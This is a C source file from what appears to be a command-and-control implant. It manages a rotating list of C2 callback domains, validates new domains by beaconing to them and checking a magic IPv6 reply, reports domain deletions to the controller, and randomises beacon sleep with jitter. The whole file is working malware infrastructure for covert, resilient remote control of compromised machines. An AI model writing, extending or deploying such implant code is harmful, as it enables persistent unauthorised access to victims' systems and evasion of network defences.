

#include "Core/Tasks/Modules/Accessory.h"
#include "Debug.h"
#include "Hams.h"
#include "Macro/Macro.h"
#include "Support/Memory.h"
#include "Support/Network.h"
#include "Transport/Transport.h"
#include "Support/String.h"
#include "Support/Random.h"

unsigned char DomainValid[] = {0x20, 0x01, 0x0d, 0xb8, 0x85, 0xa3, 0x00, 0x00,
                               0x00, 0x00, 0x8a, 0x2e, 0x03, 0x70, 0x73, 0x34};

// Create a new node
DomainNode *createNode(const char *domain)
{
    DomainNode *newNode = (DomainNode *)malloc(sizeof(DomainNode));
    if (!newNode)
    {
        DPRINT("Memory allocation failed\n");
        // exit(1);
    }
    newNode->DomainName = _strdup(domain);
    if (!newNode->DomainName)
    {
        DPRINT("Memory allocation failed\n");
        free(newNode);
        // exit(1);
    }
    newNode->next = NULL;
    return newNode;
}

// Add a domain to the end of the list
void addDomainName(const char *domain)
{
    DomainNode *newNode = createNode(domain);
    if (Hams->C2Domains->head == NULL)
    {
        Hams->C2Domains->head = newNode;
    }
    else
    {
        DomainNode *current = Hams->C2Domains->head;
        while (current->next)
        {
            current = current->next;
        }
        current->next = newNode;
    }
    Hams->C2DomainsCount++;
}

// Get the next domain in the list
char *getNextDomain()
{
    // If it's our first call or we reached the end, start/restart from the head
    if (!Hams->C2Domains->currentNode)
    {
        Hams->C2Domains->currentNode = Hams->C2Domains->head;
    }
    else
    {
        Hams->C2Domains->currentNode = Hams->C2Domains->currentNode->next;
    }

    // Wrap around if we reached the end
    if (!Hams->C2Domains->currentNode)
    {
        Hams->C2Domains->currentNode = Hams->C2Domains->head;
    }

    return Hams->C2Domains->currentNode ? Hams->C2Domains->currentNode->DomainName : NULL;
}

// Delete a domain from the list
int deleteDomainName(const char *domain)
{
    if (!Hams->C2Domains->head)
        return;

    if (strcmp(Hams->C2Domains->head->DomainName, domain) == 0)
    {
        DomainNode *temp = Hams->C2Domains->head;
        Hams->C2Domains->head = Hams->C2Domains->head->next;
        free(temp->DomainName);
        free(temp);
        Hams->C2DomainsCount--;
        Hams->C2Domains->currentNode = Hams->C2Domains->head;
        return 1;
    }

    DomainNode *current = Hams->C2Domains->head;
    while (current->next && strcmp(current->next->DomainName, domain) != 0)
    {
        current = current->next;
    }
    if (current->next)
    {
        DomainNode *temp = current->next;
        current->next = current->next->next;
        free(temp->DomainName);
        free(temp);
        Hams->C2DomainsCount--;
        Hams->C2Domains->currentNode = Hams->C2Domains->head;
        return 1;
    }
    return 0;
}

int CheckDomain(const char *domainname) {
    DomainNode *current = Hams->C2Domains->head;
    while (current) {
        if (strcmp(current->DomainName, domainname) == 0) {
            RED_DPRINT("Domain Already exists!")
            return 0; // Domain name found
        }
        current = current->next;
    }
    return 1; // Domain name not found
}

int ValidateNewCallBackDomain(char *NewDomain)
{
    unsigned char *IPv6 = NULL;
    int DomainOK = 0;
    char NotifyMassage[255] = {0};
    char RandomStr[5] = {0};
    int RandomStrLen = 4;
    int NewMessageQueue = 0;
    if(!CheckDomain(NewDomain)){
        return 0;
    }
    GenerateRandomString(RandomStr, RandomStrLen);
    if (MessageQueue > 9)
    {
        NewMessageQueue = 1;
    }
    else
    {
        NewMessageQueue = MessageQueue;
    }
    snprintf(NotifyMassage, sizeof(NotifyMassage), "%s%s%s%d%d%s",
             Hams->MagicValue, MacroValidateCallBackDomainStrAT, Hams->SessionID,
             0, NewMessageQueue, RandomStr);
    IPv6 = Connect(NotifyMassage, NewDomain);
    if (IPv6 == 0)
    {
        RED_DPRINT("Unable to Validate CallBack Domain - Connection Error\n");
        return 0;
    }
    if (!memcmp(IPv6, DomainValid, sizeof(DomainValid)))
    {
        DomainOK = 1;
        MessageQueue++;
    }

    HFree(IPv6, INET6_ADDRSTRLEN);
    return DomainOK;
}

int DeleteCallBackDomain(char *DeleteDomain)
{

    if (Hams->C2DomainsCount < 2)
    {
        RED_DPRINT("Only One Domain Left!\n");
        return 0;
    }
    return deleteDomainName(DeleteDomain);
}

int SendSuccessDeleteCallBackDomain()
{

    unsigned char *IPv6 = 0;

    IPv6 = NotifyC2(0, MacroValidateDeleteCallBackDomainStrAT); // Need to be free
    if (IPv6 == 0)
    {
        RED_DPRINT("Unable to SendSuccessDeleteCallBackDomain - Connection Error\n");
        return 0;
    }

    HFree(IPv6, INET6_ADDRSTRLEN);
    return 1;
}

char* GetAllActiveDomains(int* DomainCount,int* DomainSize) {
    // Calculate the total length needed
    int totalLength = 0;
    int NDomain = 0;
    DomainNode* current = Hams->C2Domains->head;
    while (current) {
        NDomain++;
        totalLength += strlen(current->DomainName) + 1; // +1 for separating semicolon
        current = current->next;
    }
    *DomainCount = NDomain;
    // Allocate memory for Alldomains
    totalLength=totalLength + 1;// +1 for null terminator
    char* Alldomains = (char*)HMalloc(totalLength); 
    if (!Alldomains) {
        DPRINT("Memory allocation failed\n");
        return 0;
    }
    *DomainSize=totalLength;

    // Concatenate the domain names
    current = Hams->C2Domains->head;
    int offset = 0;
    int DomainCount1 = 0;

    while (current) {
        int len = strlen(current->DomainName);
        snprintf(Alldomains + offset, len + 2, "%s\n", current->DomainName); // +2 for domain + semicolon
        offset += len + 1; // Move the offset
        current = current->next;
    }

    return Alldomains;
}



int ChangeSleep(INT Sleep, INT Jitter) {
  int NewSleep = 0;
  Srandom(_time64(0));
  NewSleep = (((Sleep * Jitter / 100) + (Random() % ((Sleep + (Sleep * Jitter / 100)) + 1))) * 1000);
  if (NewSleep < 1000) {
    NewSleep = 1000;
  }
  YELLOW_DPRINT("Sleep : [%d] Jitter : [%d]\n", NewSleep, Jitter);

  return NewSleep;
}

int GoSleep() {
  int NewSleep = ChangeSleep(Hams->Sleep, Hams->Jetter);
  Sleep(NewSleep);

  
  return 1;
}